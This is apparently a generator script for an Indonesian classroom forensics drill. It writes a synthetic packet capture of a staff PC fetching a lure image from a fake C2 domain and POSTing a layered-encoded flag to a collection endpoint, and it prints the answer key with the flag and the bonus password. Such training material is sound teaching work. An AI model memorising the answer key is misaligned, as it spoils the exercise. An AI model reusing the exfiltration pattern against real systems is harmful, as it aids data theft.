#!/usr/bin/env python3
"""
Generator berkas simulasi LAB 04 - THE WRITE-UP DRILL (JCC 2026).
Hanya memakai pustaka standar Python 3, tanpa scapy dan tanpa Pillow.

Menghasilkan simulasi_jcc.pcapng berisi rantai lengkap tiga lab sebelumnya:
  LAB 02  ->  query DNS ke domain mencurigakan
  LAB 02  ->  berkas PNG yang bisa ditarik lewat Export Objects
  LAB 01  ->  request POST ke endpoint rahasia, dibaca via Follow TCP Stream
  LAB 03  ->  payload berlapis tiga di dalam body POST
  LAB 03  ->  hash MD5 sebagai tantangan bonus

Jalankan:  python3 generate_simulasi.py [--preview]
"""
import sys
import os
import struct
import zlib
import base64
import hashlib

OUTDIR = os.path.dirname(os.path.abspath(__file__))
MSS = 1460

FLAG = "JCC{m15510n_4cc0mpl15h3d_wr1t3up_r34dy}"
BONUS_PASS = "qwerty123"

IP_STAF = "192.168.10.58"
IP_DNS = "192.168.10.1"
IP_INTRANET = "192.168.10.20"
IP_C2 = "45.83.220.114"
IP_TLS = "142.250.199.78"

MAC_STAF = "080027c4d109"
MAC_GW = "001c42a1b2c3"
MAC_INTRA = "001c4233aa71"

HOST_INTRA = "intranet.smkmaska.local"
HOST_C2 = "cdn-update.paket-gratis.tk"

# ==========================================================================
# BAGIAN 1: PENULIS PNG DAN FONT BITMAP 5x7
# Disalin utuh dari lab02 supaya folder ini tetap berdiri sendiri.
# ==========================================================================
FONT = {
    "A": ".###.:#...#:#...#:#####:#...#:#...#:#...#",
    "B": "####.:#...#:#...#:####.:#...#:#...#:####.",
    "C": ".###.:#...#:#....:#....:#....:#...#:.###.",
    "D": "####.:#...#:#...#:#...#:#...#:#...#:####.",
    "E": "#####:#....:#....:####.:#....:#....:#####",
    "F": "#####:#....:#....:####.:#....:#....:#....",
    "G": ".###.:#...#:#....:#.###:#...#:#...#:.###.",
    "H": "#...#:#...#:#...#:#####:#...#:#...#:#...#",
    "I": "#####:..#..:..#..:..#..:..#..:..#..:#####",
    "J": "..###:...#.:...#.:...#.:...#.:#..#.:.##..",
    "K": "#...#:#..#.:#.#..:##...:#.#..:#..#.:#...#",
    "L": "#....:#....:#....:#....:#....:#....:#####",
    "M": "#...#:##.##:#.#.#:#...#:#...#:#...#:#...#",
    "N": "#...#:##..#:#.#.#:#..##:#...#:#...#:#...#",
    "O": ".###.:#...#:#...#:#...#:#...#:#...#:.###.",
    "P": "####.:#...#:#...#:####.:#....:#....:#....",
    "Q": ".###.:#...#:#...#:#...#:#.#.#:#..#.:.##.#",
    "R": "####.:#...#:#...#:####.:#.#..:#..#.:#...#",
    "S": ".####:#....:#....:.###.:....#:....#:####.",
    "T": "#####:..#..:..#..:..#..:..#..:..#..:..#..",
    "U": "#...#:#...#:#...#:#...#:#...#:#...#:.###.",
    "V": "#...#:#...#:#...#:#...#:#...#:.#.#.:..#..",
    "W": "#...#:#...#:#...#:#.#.#:#.#.#:##.##:#...#",
    "X": "#...#:#...#:.#.#.:..#..:.#.#.:#...#:#...#",
    "Y": "#...#:#...#:.#.#.:..#..:..#..:..#..:..#..",
    "Z": "#####:....#:...#.:..#..:.#...:#....:#####",
    "0": ".###.:#...#:#..##:#.#.#:##..#:#...#:.###.",
    "1": "..#..:.##..:..#..:..#..:..#..:..#..:.###.",
    "2": ".###.:#...#:....#:...#.:..#..:.#...:#####",
    "3": "#####:...#.:..#..:...#.:....#:#...#:.###.",
    "4": "...#.:..##.:.#.#.:#..#.:#####:...#.:...#.",
    "5": "#####:#....:####.:....#:....#:#...#:.###.",
    "6": "..##.:.#...:#....:####.:#...#:#...#:.###.",
    "7": "#####:....#:...#.:..#..:.#...:.#...:.#...",
    "8": ".###.:#...#:#...#:.###.:#...#:#...#:.###.",
    "9": ".###.:#...#:#...#:.####:....#:...#.:.##..",
    "{": "...##:..#..:..#..:.#...:..#..:..#..:...##",
    "}": "##...:..#..:..#..:...#.:..#..:..#..:##...",
    "_": ".....:.....:.....:.....:.....:.....:#####",
    "-": ".....:.....:.....:#####:.....:.....:.....",
    ".": ".....:.....:.....:.....:.....:.##..:.##..",
    ",": ".....:.....:.....:.....:.....:..##.:..#..",
    ":": ".....:..#..:..#..:.....:..#..:..#..:.....",
    "/": "....#:....#:...#.:..#..:.#...:#....:#....",
    "(": "...#.:..#..:.#...:.#...:.#...:..#..:...#.",
    ")": ".#...:..#..:...#.:...#.:...#.:..#..:.#...",
    "!": "..#..:..#..:..#..:..#..:..#..:.....:..#..",
    ">": "#....:.#...:..#..:...#.:..#..:.#...:#....",
    " ": ".....:.....:.....:.....:.....:.....:.....",
}

NAVY = (0, 53, 95)
GOLD = (212, 160, 23)
WHITE = (249, 249, 254)
RED = (150, 30, 40)
GREY = (140, 148, 165)


class Canvas:
    def __init__(self, w, h, bg=(255, 255, 255)):
        self.w, self.h = w, h
        self.px = bytearray(bytes(bg) * (w * h))

    def rect(self, x0, y0, x1, y1, color):
        r, g, b = color
        for y in range(max(0, y0), min(self.h, y1)):
            base = y * self.w * 3
            for x in range(max(0, x0), min(self.w, x1)):
                i = base + x * 3
                self.px[i], self.px[i + 1], self.px[i + 2] = r, g, b

    def frame(self, x0, y0, x1, y1, color, t=3):
        self.rect(x0, y0, x1, y0 + t, color)
        self.rect(x0, y1 - t, x1, y1, color)
        self.rect(x0, y0, x0 + t, y1, color)
        self.rect(x1 - t, y0, x1, y1, color)

    def text(self, x, y, s, color, scale=3, spacing=1):
        cx = x
        for ch in s.upper():
            for row, bits in enumerate(FONT.get(ch, FONT[" "]).split(":")):
                for col, bit in enumerate(bits):
                    if bit == "#":
                        self.rect(cx + col * scale, y + row * scale,
                                  cx + (col + 1) * scale, y + (row + 1) * scale, color)
            cx += (5 + spacing) * scale
        return cx

    def to_png(self, comment=None):
        raw = bytearray()
        stride = self.w * 3
        for y in range(self.h):
            raw.append(0)
            raw += self.px[y * stride:(y + 1) * stride]

        def chunk(tag, data):
            body = tag + data
            return (struct.pack("!I", len(data)) + body +
                    struct.pack("!I", zlib.crc32(body) & 0xFFFFFFFF))

        out = b"\x89PNG\r\n\x1a\n"
        out += chunk(b"IHDR", struct.pack("!IIBBBBB", self.w, self.h, 8, 2, 0, 0, 0))
        if comment:
            out += chunk(b"tEXt", b"Comment\x00" + comment.encode("latin-1", "replace"))
        out += chunk(b"IDAT", zlib.compress(bytes(raw), 9))
        out += chunk(b"IEND", b"")
        return out


def make_panduan_png():
    c = Canvas(1060, 430, NAVY)
    c.frame(16, 16, 1044, 414, GOLD, 4)
    c.rect(40, 42, 1020, 92, RED)
    c.text(58, 56, "PANDUAN UPDATE DRIVER PRINTER LAB", WHITE, scale=3)
    c.text(58, 126, "LANGKAH 1 : JALANKAN BERKAS UPDATE", WHITE, scale=3)
    c.text(58, 166, "LANGKAH 2 : BIARKAN JENDELA TERBUKA 5 MENIT", WHITE, scale=3)
    c.text(58, 206, "LANGKAH 3 : DATA LAMA TERKIRIM OTOMATIS", WHITE, scale=3)
    c.rect(58, 248, 1002, 252, GREY)
    c.text(58, 272, "CATATAN TEKNIS INTERNAL", GOLD, scale=4)
    c.text(58, 322, "PAYLOAD DIBUNGKUS 3 LAPIS SEBELUM DIKIRIM", WHITE, scale=3)
    c.text(58, 358, "BUKA DARI LAPIS TERLUAR KE DALAM", WHITE, scale=3)
    return c.to_png(comment="Berkas ini bukan panduan resmi sekolah.")


# ==========================================================================
# BAGIAN 2: MENYUSUN PAYLOAD BERLAPIS
# Urutan bungkus (dalam ke luar): FLAG -> Reverse -> To Hex -> To Base64
# Urutan bongkar (luar ke dalam): From Base64 -> From Hex -> Reverse -> FLAG
# ==========================================================================
lapis_reverse = FLAG[::-1]
lapis_hex = lapis_reverse.encode().hex()
PAYLOAD = base64.b64encode(lapis_hex.encode()).decode()

TOKEN_MD5 = hashlib.md5(BONUS_PASS.encode()).hexdigest()

# ==========================================================================
# BAGIAN 3: PENYUSUN PAKET
# ==========================================================================
packets = []
_ident = [0x7000]


def cksum(d):
    if len(d) % 2:
        d += b"\x00"
    s = 0
    for i in range(0, len(d), 2):
        s += (d[i] << 8) + d[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def ipb(a):
    return bytes(int(x) for x in a.split("."))


def build_ipv4(src, dst, proto, payload):
    _ident[0] = (_ident[0] + 1) & 0xFFFF
    h = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), _ident[0],
                    0x4000, 64, proto, 0, ipb(src), ipb(dst))
    return h[:10] + struct.pack("!H", cksum(h)) + h[12:] + payload


def build_tcp(src, dst, sp, dp, seq, ack, flags, payload=b"", win=64240):
    h = struct.pack("!HHIIBBHHH", sp, dp, seq, ack, 0x50, flags, win, 0, 0)
    seg = h + payload
    ps = ipb(src) + ipb(dst) + struct.pack("!BBH", 0, 6, len(seg))
    return seg[:16] + struct.pack("!H", cksum(ps + seg)) + seg[18:]


def build_udp(src, dst, sp, dp, payload):
    seg = struct.pack("!HHHH", sp, dp, 8 + len(payload), 0) + payload
    ps = ipb(src) + ipb(dst) + struct.pack("!BBH", 0, 17, len(seg))
    return seg[:6] + struct.pack("!H", cksum(ps + seg) or 0xFFFF) + seg[8:]


def emit(ts, dmac, smac, ipframe):
    raw = bytes.fromhex(dmac) + bytes.fromhex(smac) + b"\x08\x00" + ipframe
    if len(raw) < 60:
        raw += b"\x00" * (60 - len(raw))
    packets.append((ts, raw))


class TcpFlow:
    FIN, SYN, RST, PSH, ACK = 0x01, 0x02, 0x04, 0x08, 0x10

    def __init__(self, t0, cip, cmac, cport, sip, smac, sport):
        self.t = t0
        self.cip, self.cmac, self.cport = cip, cmac, cport
        self.sip, self.smac, self.sport = sip, smac, sport
        self.cseq = 0x22000000 + (cport * 7919) % 0xFFFFF
        self.sseq = 0x99000000 + (sport * 104729) % 0xFFFFF

    def tick(self, dt):
        self.t = round(self.t + dt, 6)
        return self.t

    def _c2s(self, flags, payload=b"", dt=0.0004):
        seg = build_tcp(self.cip, self.sip, self.cport, self.sport,
                        self.cseq, self.sseq, flags, payload)
        emit(self.tick(dt), self.smac, self.cmac, build_ipv4(self.cip, self.sip, 6, seg))
        self.cseq += len(payload) + (1 if flags & (self.SYN | self.FIN) else 0)

    def _s2c(self, flags, payload=b"", dt=0.0004):
        seg = build_tcp(self.sip, self.cip, self.sport, self.cport,
                        self.sseq, self.cseq, flags, payload, win=65535)
        emit(self.tick(dt), self.cmac, self.smac, build_ipv4(self.sip, self.cip, 6, seg))
        self.sseq += len(payload) + (1 if flags & (self.SYN | self.FIN) else 0)

    def handshake(self):
        self._c2s(self.SYN)
        self._s2c(self.SYN | self.ACK, dt=0.0170)
        self._c2s(self.ACK, dt=0.0003)

    def request(self, data, dt=0.0025):
        self._c2s(self.PSH | self.ACK, data, dt=dt)

    def response(self, data, first_dt=0.0320):
        chunks = [data[i:i + MSS] for i in range(0, len(data), MSS)] or [b""]
        for n, ch in enumerate(chunks):
            last = (n == len(chunks) - 1)
            self._s2c(self.PSH | self.ACK if last else self.ACK, ch,
                      dt=first_dt if n == 0 else 0.0010)
            if last or n % 2 == 1:
                self._c2s(self.ACK, dt=0.0002)

    def close(self):
        self._c2s(self.FIN | self.ACK, dt=0.0040)
        self._s2c(self.ACK, dt=0.0008)
        self._s2c(self.FIN | self.ACK, dt=0.0006)
        self._c2s(self.ACK, dt=0.0003)


def dns_name(name):
    out = b""
    for lb in name.split("."):
        out += bytes([len(lb)]) + lb.encode()
    return out + b"\x00"


def dns_pair(ts, txid, host, answer_ip, sport):
    q = dns_name(host) + struct.pack("!HH", 1, 1)
    query = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0) + q
    emit(ts, MAC_GW, MAC_STAF,
         build_ipv4(IP_STAF, IP_DNS, 17, build_udp(IP_STAF, IP_DNS, sport, 53, query)))
    reply = (struct.pack("!HHHHHH", txid, 0x8180, 1, 1, 0, 0) + q +
             struct.pack("!HHHIH", 0xC00C, 1, 1, 60, 4) + ipb(answer_ip))
    emit(round(ts + 0.0198, 6), MAC_STAF, MAC_GW,
         build_ipv4(IP_DNS, IP_STAF, 17, build_udp(IP_DNS, IP_STAF, 53, sport, reply)))


UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"


def http_get(path, host, accept="text/html,application/xhtml+xml,*/*;q=0.8", ref=None):
    h = [f"GET {path} HTTP/1.1", f"Host: {host}", f"User-Agent: {UA}",
         f"Accept: {accept}", "Accept-Language: id,en-US;q=0.7",
         "Connection: keep-alive"]
    if ref:
        h.append(f"Referer: {ref}")
    return ("\r\n".join(h) + "\r\n\r\n").encode()


def http_post(path, host, body, ctype="application/x-www-form-urlencoded", ref=None):
    h = [f"POST {path} HTTP/1.1", f"Host: {host}", f"User-Agent: {UA}",
         "Accept: */*", f"Content-Type: {ctype}",
         f"Content-Length: {len(body)}", f"Origin: http://{host}",
         "Connection: keep-alive"]
    if ref:
        h.append(f"Referer: {ref}")
    return ("\r\n".join(h) + "\r\n\r\n" + body).encode()


def http_resp(status, ctype, body, extra=()):
    h = [f"HTTP/1.1 {status}", "Date: Fri, 27 Feb 2026 02:20:14 GMT",
         "Server: nginx/1.24.0", *extra,
         f"Content-Type: {ctype}", f"Content-Length: {len(body)}",
         "Connection: keep-alive"]
    return ("\r\n".join(h) + "\r\n\r\n").encode() + body


# ==========================================================================
# BAGIAN 4: MERANGKAI SKENARIO
# ==========================================================================
T0 = 1772158800.000000   # Jumat, 27 Februari 2026, 09:20:00 WIB

dns_pair(T0 + 0.0000, 0x5A01, HOST_INTRA, IP_INTRANET, 53101)
dns_pair(T0 + 0.6100, 0x5A02, "www.smkmaska.sch.id", "103.28.14.92", 53102)

PENGUMUMAN = (
    "<!DOCTYPE html>\n<html lang=\"id\"><head><meta charset=\"UTF-8\">\n"
    "<title>Pengumuman Internal - SMK Maskumambang 1</title></head><body>\n"
    "<h1>Pengumuman Unit TIK</h1>\n"
    "<p>Printer Lab Multimedia bermasalah sejak kemarin. Silakan unduh panduan\n"
    "update driver melalui tautan berikut.</p>\n"
    f"<p><a href=\"http://{HOST_C2}/unduh/panduan-update.png\">"
    "Unduh panduan update driver printer</a></p>\n"
    "<p>Hubungi teknisi bila masih gagal.</p>\n"
    "</body></html>\n"
).encode()

f1 = TcpFlow(T0 + 1.2400, IP_STAF, MAC_STAF, 52310, IP_INTRANET, MAC_INTRA, 80)
f1.handshake()
f1.request(http_get("/pengumuman.html", HOST_INTRA))
f1.response(http_resp("200 OK", "text/html; charset=UTF-8", PENGUMUMAN))

# POST pengecoh: login wajar ke intranet sekolah
f1.request(http_post("/login.php", HOST_INTRA,
                     "username=staf_lab&password=Lab2026!Aman",
                     ref=f"http://{HOST_INTRA}/pengumuman.html"), dt=0.0450)
f1.response(http_resp("302 Found", "text/html",
                      b"", extra=["Location: /dashboard.php",
                                  "Set-Cookie: SESSID=4a91c0de77; path=/"]))
f1.close()

dns_pair(T0 + 4.8800, 0x5A03, HOST_C2, IP_C2, 53103)

PANDUAN = make_panduan_png()

f2 = TcpFlow(T0 + 5.4100, IP_STAF, MAC_STAF, 52344, IP_C2, MAC_GW, 80)
f2.handshake()
f2.request(http_get("/unduh/panduan-update.png", HOST_C2,
                    "image/avif,image/webp,*/*",
                    ref=f"http://{HOST_INTRA}/pengumuman.html"))
f2.response(http_resp("200 OK", "image/png", PANDUAN,
                      extra=["Content-Disposition: inline; "
                             "filename=\"panduan-update.png\""]))
f2.close()

# POST sebenarnya: pengiriman data ke endpoint rahasia
BODY = (f"id=WS-LAB-58&host=lab-multimedia-07&token={TOKEN_MD5}"
        f"&ts=1772158812&data={PAYLOAD}")

f3 = TcpFlow(T0 + 12.0600, IP_STAF, MAC_STAF, 52377, IP_C2, MAC_GW, 80)
f3.handshake()
f3.request(http_post("/api/v2/collect", HOST_C2, BODY))
f3.response(http_resp("200 OK", "application/json",
                      b'{"status":"ok","received":1,"next_beacon":300}'))
f3.close()

# Derau: permintaan gagal
f4 = TcpFlow(T0 + 15.9200, IP_STAF, MAC_STAF, 52390, IP_C2, MAC_GW, 80)
f4.handshake()
f4.request(http_get("/api/v2/ping", HOST_C2, "*/*"))
f4.response(http_resp("404 Not Found", "text/html",
                      b"<html><body>404</body></html>"))
f4.close()


# Pembanding terenkripsi
def client_hello(sni):
    s = sni.encode()
    ext_sni = (b"\x00\x00" + struct.pack("!H", len(s) + 5) +
               struct.pack("!H", len(s) + 3) + b"\x00" +
               struct.pack("!H", len(s)) + s)
    ext_ver = b"\x00\x2b\x00\x03\x02\x03\x04"
    exts = ext_sni + ext_ver
    body = (b"\x03\x03" + bytes(range(32)) + b"\x20" + bytes(range(0x40, 0x60)) +
            struct.pack("!H", 4) + b"\x13\x01\x13\x02" + b"\x01\x00" +
            struct.pack("!H", len(exts)) + exts)
    hs = b"\x01" + struct.pack("!I", len(body))[1:] + body
    return b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs


def app_data(seed, size):
    return b"\x17\x03\x03" + struct.pack("!H", size) + \
        bytes(((seed * 41 + i * 83) % 251) + 3 for i in range(size))


f5 = TcpFlow(T0 + 18.7300, IP_STAF, MAC_STAF, 52401, IP_TLS, MAC_GW, 443)
f5.handshake()
f5.request(client_hello("www.google.com"))
f5.response(app_data(13, 640), first_dt=0.0240)
f5.request(app_data(29, 200), dt=0.0048)
f5.response(app_data(61, 980), first_dt=0.0195)
f5.close()

packets.sort(key=lambda p: p[0])

# ==========================================================================
# BAGIAN 5: MENULIS PCAPNG
# ==========================================================================
OUT = os.path.join(OUTDIR, "simulasi_jcc.pcapng")


def pad4(b):
    return b + b"\x00" * ((4 - len(b) % 4) % 4)


def block(btype, body):
    total = 12 + len(body)
    return struct.pack("<II", btype, total) + body + struct.pack("<I", total)


with open(OUT, "wb") as fh:
    name = b"SIMULASI JCC 2026 - LAB 04"
    shb = (struct.pack("<IHHq", 0x1A2B3C4D, 1, 0, -1) +
           struct.pack("<HH", 3, len(name)) + pad4(name) + struct.pack("<HH", 0, 0))
    fh.write(block(0x0A0D0D0A, shb))

    ifn = b"lab-switch-utama"
    idb = (struct.pack("<HHI", 1, 0, 65535) +
           struct.pack("<HH", 9, 1) + pad4(bytes([6])) +
           struct.pack("<HH", 2, len(ifn)) + pad4(ifn) + struct.pack("<HH", 0, 0))
    fh.write(block(0x00000001, idb))

    for ts, raw in packets:
        us = int(round(ts * 1_000_000))
        epb = struct.pack("<IIIII", 0, us >> 32, us & 0xFFFFFFFF,
                          len(raw), len(raw)) + pad4(raw)
        fh.write(block(0x00000006, epb))

# ==========================================================================
# BAGIAN 6: VERIFIKASI MANDIRI
# ==========================================================================
cek = base64.b64decode(PAYLOAD).decode()
cek = bytes.fromhex(cek).decode()
cek = cek[::-1]
assert cek == FLAG, "rantai payload gagal dibongkar"

print(f"berkas simulasi : {OUT}")
print(f"paket           : {len(packets)}")
print(f"ukuran          : {os.path.getsize(OUT)} byte")
print()
print("=" * 74)
print("KUNCI JAWABAN - JANGAN DIBAGIKAN KE SISWA")
print("=" * 74)
print(f"domain intranet : {HOST_INTRA} -> {IP_INTRANET}")
print(f"domain C2       : {HOST_C2} -> {IP_C2}")
print(f"endpoint rahasia: POST http://{HOST_C2}/api/v2/collect")
print(f"berkas terunduh : panduan-update.png ({len(PANDUAN)} byte, "
      f"md5={hashlib.md5(PANDUAN).hexdigest()})")
print(f"token MD5       : {TOKEN_MD5} -> {BONUS_PASS}")
print()
print("payload berlapis (urutan bongkar):")
print(f"  lapis 1 Base64  : {PAYLOAD[:56]}...")
print(f"  lapis 2 Hex     : {lapis_hex[:56]}...")
print(f"  lapis 3 Reverse : {lapis_reverse}")
print(f"  FLAG            : {FLAG}")
print()
print("verifikasi rantai payload: BERHASIL")

if "--preview" in sys.argv:
    p = os.path.join(OUTDIR, "_preview-panduan.png")
    with open(p, "wb") as fh:
        fh.write(PANDUAN)
    print(f"\npratinjau gambar: {p}")
    print("HAPUS berkas ini sebelum folder dibagikan ke siswa.")
